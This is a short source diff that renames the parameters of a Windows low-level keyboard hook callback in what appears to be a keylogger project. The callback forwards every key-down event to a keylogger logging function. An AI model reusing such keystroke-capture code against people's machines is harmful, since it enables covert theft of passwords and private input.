@@ -8,14 +8,14 @@ using namespace std::chrono_literals;
 
 HHOOK hook;
 
-LRESULT WINAPI hook_callback(int code, WPARAM w_param, LPARAM l_param) noexcept
+LRESULT WINAPI hook_callback(int code, WPARAM wparam, LPARAM lparam) noexcept
 {
-    if (code >= 0 && w_param == WM_KEYDOWN)
+    if (code >= 0 && wparam == WM_KEYDOWN)
     {
-        keylogger::log_kbd(reinterpret_cast<KBDLLHOOKSTRUCT*>(l_param));
+        keylogger::log_kbd(reinterpret_cast<KBDLLHOOKSTRUCT*>(lparam));
     }
 
-    return CallNextHookEx(hook, code, w_param, l_param);
+    return CallNextHookEx(hook, code, wparam, lparam);
 }
 
 void keyboard::set_hook()
